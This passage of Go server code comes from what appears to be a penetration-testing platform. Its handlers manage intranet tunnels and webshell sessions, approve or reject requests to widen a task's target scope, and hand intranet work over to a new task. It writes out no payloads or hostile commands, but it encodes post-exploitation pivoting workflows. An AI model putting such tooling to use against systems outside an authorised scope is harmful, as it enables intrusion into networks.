	pg := s.pg(w)
	if pg == nil {
		return nil, nil, false
	}
	t, err := pg.GetIntranetTunnel(id)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return nil, nil, false
	}
	return pg, t, true
}

func (s *Server) probeIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	if t.SessionID == nil || *t.SessionID <= 0 {
		writeErr(w, 400, "隧道未绑定会话")
		return
	}
	sess, err := s.intranetSession(pg, *t.SessionID)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	info, out := s.intranetProbe(r.Context(), pg, sess)
	writeJSON(w, 200, map[string]any{"probe": info, "result": out})
}

func (s *Server) planIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetTunnelActionDTO
	_ = decode(r, &req)
	updated, info, err := s.intranetPlanTunnel(r.Context(), pg, t, req.DeployCommand, req.VerifyCommand, req.TeardownCommand)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": updated, "probe": info})
}

func (s *Server) deployIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetTunnelActionDTO
	_ = decode(r, &req)
	ttl := time.Duration(req.TTLSeconds) * time.Second
	updated, out, err := s.intranetDeployTunnel(r.Context(), pg, t, ttl)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	code := 200
	if updated.Status == db.IntranetTunnelFailed {
		code = 400
	}
	writeJSON(w, code, map[string]any{"tunnel": updated, "result": out, "access": s.intranetTunnelAccess(pg, updated)})
}

func (s *Server) verifyIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	updated, out, err := s.intranetVerifyTunnel(r.Context(), pg, t)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	code := 200
	if updated.Status != db.IntranetTunnelVerified {
		code = 400
	}
	writeJSON(w, code, map[string]any{"tunnel": updated, "result": out, "access": s.intranetTunnelAccess(pg, updated)})
}

func (s *Server) teardownIntranetTunnel(w http.ResponseWriter, r *http.Request) {
	pg, t, ok := s.intranetTunnelFromRequest(w, r)
	if !ok {
		return
	}
	if s.resourceMgr != nil {
		if res, _ := pg.FindActiveManagedResourceByTunnel(t.ID); res != nil {
			_, _ = s.resourceMgr.release(r.Context(), res.ID, "手动拆除隧道")
		} else {
			s.intranetStopTunnel(r.Context(), t.ID, "手动拆除隧道")
		}
	} else {
		s.intranetStopTunnel(r.Context(), t.ID, "手动拆除隧道")
	}
	updated, err := pg.GetIntranetTunnel(t.ID)
	if err != nil {
		writeErr(w, 404, "隧道不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"tunnel": updated})
}

// ---------------------------------------------------------------------------
// 范围审批
// ---------------------------------------------------------------------------

func (s *Server) listIntranetScopeRequests(w http.ResponseWriter, r *http.Request) {
	pg := s.pg(w)
	if pg == nil {
		return
	}
	q := r.URL.Query()
	taskID, _ := strconv.ParseInt(strings.TrimSpace(q.Get("task_id")), 10, 64)
	rows, total, err := pg.ListIntranetScopeRequests(q.Get("status"), taskID, atoiDefault(q.Get("limit"), 100), atoiDefault(q.Get("offset"), 0))
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"requests": rows, "total": total})
}

func (s *Server) createIntranetScopeRequest(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		TaskID    int64  `json:"task_id"`
		Host      string `json:"host"`
		Port      int    `json:"port"`
		Reason    string `json:"reason"`
		SessionID int64  `json:"session_id"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	req.Host = intranetHost(req.Host)
	row, created, err := pg.CreateIntranetScopeRequest(db.IntranetScopeRequestInput{
		TaskID: req.TaskID, Host: req.Host, Port: req.Port, Reason: req.Reason, SessionID: req.SessionID,
	})
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"request": row, "created": created})
}

func (s *Server) approveIntranetScopeRequest(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的申请 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Note string `json:"note"`
	}
	_ = decode(r, &req)
	pg := s.pg(w)
	if pg == nil {
		return
	}
	pending, err := pg.GetIntranetScopeRequest(id)
	if err != nil {
		writeErr(w, 404, "申请不存在")
		return
	}
	if pending.Status != db.IntranetScopePending {
		writeErr(w, 409, "该申请已处理")
		return
	}
	kind := "subdomain"
	if net.ParseIP(pending.Host) != nil {
		kind = "ip"
	}
	if _, err := pg.Assets().AddAgentScope(pending.TaskID, kind, pending.Host, displayOr(strings.TrimSpace(pending.Reason), "内网范围审批"), "manual"); err != nil {
		writeErr(w, 400, "写入任务范围失败: "+err.Error())
		return
	}
	row, found, err := pg.DecideIntranetScopeRequest(id, true, req.Note)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if !found {
		writeErr(w, 409, "该申请已处理")
		return
	}
	// 资产回流：批准的范围同步登记为平台资产，避免内网发现只停留在审批表里。
	assets := map[string]any{"registered": false}
	var warnings []string
	if ip := net.ParseIP(pending.Host); ip != nil {
		ipID, aerr := pg.Assets().UpsertIP(db.UpsertIPReq{IP: pending.Host, TaskID: pending.TaskID})
		if aerr != nil {
			warnings = append(warnings, "登记 IP 资产失败: "+aerr.Error())
		} else {
			assets["registered"] = true
			assets["ip_id"] = ipID
			if pending.Port > 0 {
				svcID, serr := pg.Assets().UpsertOtherService(db.UpsertOtherServiceReq{
					IP: pending.Host, Port: pending.Port, ServiceName: "tcp",
					Extra: map[string]any{"source": "intranet_scope_approval"}, TaskID: pending.TaskID,
				})
				if serr != nil {
					warnings = append(warnings, "登记端口资产失败: "+serr.Error())
				} else {
					assets["service_id"] = svcID
				}
			}
		}
	} else if pending.Port > 0 {
		svcID, serr := pg.Assets().UpsertOtherService(db.UpsertOtherServiceReq{
			Domain: pending.Host, Port: pending.Port, ServiceName: "tcp",
			Extra: map[string]any{"source": "intranet_scope_approval"}, TaskID: pending.TaskID,
		})
		if serr != nil {
			warnings = append(warnings, "登记端口资产失败: "+serr.Error())
		} else {
			assets["registered"] = true
			assets["service_id"] = svcID
		}
	} else {
		warnings = append(warnings, "域名目标未带端口，未写入资产（可补充端口后重新申请）")
	}
	writeJSON(w, 200, map[string]any{"request": row, "assets": assets, "warnings": warnings})
}

func (s *Server) rejectIntranetScopeRequest(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的申请 ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req struct {
		Note string `json:"note"`
	}
	_ = decode(r, &req)
	pg := s.pg(w)
	if pg == nil {
		return
	}
	row, found, err := pg.DecideIntranetScopeRequest(id, false, req.Note)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	if !found {
		writeErr(w, 409, "该申请已处理或不存在")
		return
	}
	writeJSON(w, 200, map[string]any{"request": row})
}

// ---------------------------------------------------------------------------
// 任务交接
// ---------------------------------------------------------------------------

func (s *Server) handoffIntranetTask(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req intranetHandoffDTO
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	task, warnings, err := s.intranetHandoff(pg, req)
	if err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"task": task, "warnings": warnings})
}

func (s *Server) intranetHandoff(pg *db.DB, req intranetHandoffDTO) (*Task, []string, error) {
	if req.FromTaskID <= 0 {
		return nil, nil, errors.New("需要 from_task_id")
	}
	from, err := pg.GetTask(req.FromTaskID)
	if err != nil {
		return nil, nil, err
	}
	if from == nil {
		return nil, nil, errors.New("来源任务不存在")
	}
	goal := strings.TrimSpace(req.Goal)
	if goal == "" {
		goal = "接手任务 #" + strconv.FormatInt(from.ID, 10) + " 的内网后续测试。原任务目标：" + from.Goal
	}
	desc := strings.TrimSpace(req.Description)
	if desc == "" {
		desc = from.Description
	}
	name := strings.TrimSpace(req.Name)
	if name == "" {
		name = "内网交接 · " + displayOr(from.Name, from.Goal)
	}
	task, err := s.m.CreateTaskWithOptions(desc, goal, db.TaskCreateOptions{
		Name:          name,
		SourceTaskIDs: []int64{from.ID},
	})
	if err != nil {
		return nil, nil, err
	}
	newID, err := strconv.ParseInt(task.ID, 10, 64)
	if err != nil || newID <= 0 {
		return nil, nil, errors.New("新任务已创建，但解析任务 ID 失败")
	}
	var warnings []string
	scopes, err := pg.Assets().ListTaskScope(from.ID)
	if err != nil {
		warnings = append(warnings, "读取原任务范围失败: "+err.Error())
	}
	copied := 0
	for _, ts := range scopes {
		value := ""
		switch ts.Kind {
		case "company":
			if ts.CompanyID != nil {
				value = strconv.FormatInt(*ts.CompanyID, 10)
			}
		case "root_domain", "subdomain":
			value = ts.Domain
		case "ip", "cidr":
			value = ts.Net
		default:
			value = ts.Value
		}
		if value == "" {
			continue
		}
		if _, err := pg.Assets().AddAgentScope(newID, ts.Kind, value, ts.Reason, "manual"); err != nil {
			warnings = append(warnings, fmt.Sprintf("复制范围 %s %s 失败: %v", ts.Kind, value, err))
			continue
		}
		copied++
	}
	sessionIDs := req.SessionIDs
	if len(sessionIDs) == 0 {
		if sessions, _, err := pg.ListIntranetSessions("", from.ID, 500, 0); err == nil {
			for _, sess := range sessions {
				sessionIDs = append(sessionIDs, sess.ID)
			}
		}
	}
	tunnelIDs := req.TunnelIDs
	if len(tunnelIDs) == 0 {
		if tunnels, _, err := pg.ListIntranetTunnels("", from.ID, 0, 500, 0); err == nil {
			for _, t := range tunnels {
				tunnelIDs = append(tunnelIDs, t.ID)
			}
		}
	}
	for _, sid := range sessionIDs {
		if err := pg.SetIntranetSessionTask(sid, newID); err != nil {
			warnings = append(warnings, fmt.Sprintf("会话 #%d 归属更新失败: %v", sid, err))
		}
	}
	for _, tid := range tunnelIDs {
		if err := pg.SetIntranetTunnelTask(tid, newID); err != nil {
			warnings = append(warnings, fmt.Sprintf("隧道 #%d 归属更新失败: %v", tid, err))
		}
	}
	if s.engine != nil {
		s.launchTask(task, strings.TrimSpace(desc+" "+goal), false)
	}
	return task, warnings, nil
}

// ---------------------------------------------------------------------------
// 工具复用的高层入口
// ---------------------------------------------------------------------------

// intranetOpenSession creates a session for a webshell and verifies it answers.
func (s *Server) intranetOpenSession(ctx context.Context, pg *db.DB, webshellID, taskID int64, name, host, cwd, note string) (*db.IntranetSession, intranetProbeInfo, error) {
	shell, err := pg.GetWebshell(webshellID)
	if err != nil {
		return nil, intranetProbeInfo{}, errors.New("webshell 不存在")
	}
	if strings.TrimSpace(shell.URL) == "" {
		return nil, intranetProbeInfo{}, errors.New("该 webshell 没有可用地址")
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		return nil, intranetProbeInfo{}, errors.New("webshell 地址命中资产拦截规则：" + reason)
	}
	if strings.TrimSpace(host) == "" {
		host = displayOr(intranetHost(shell.Target), intranetHost(shell.URL))
	}
	sess, err := pg.CreateIntranetSession(db.IntranetSessionInput{
		Name: name, WebshellID: webshellID, TaskID: taskID, Host: host, Cwd: cwd, Note: note,
	})
	if err != nil {
		return nil, intranetProbeInfo{}, err
	}
	info, out := s.intranetProbe(ctx, pg, sess)
	if out.IsError && strings.TrimSpace(info.Raw) == "" {
		_, _ = pg.UpdateIntranetSessionState(sess.ID, "", db.IntranetSessionClosed, "初始探测失败")
		return sess, info, errors.New("会话已创建但探测失败: " + displayOr(out.Note, "无回显"))
	}
	return sess, info, nil
}
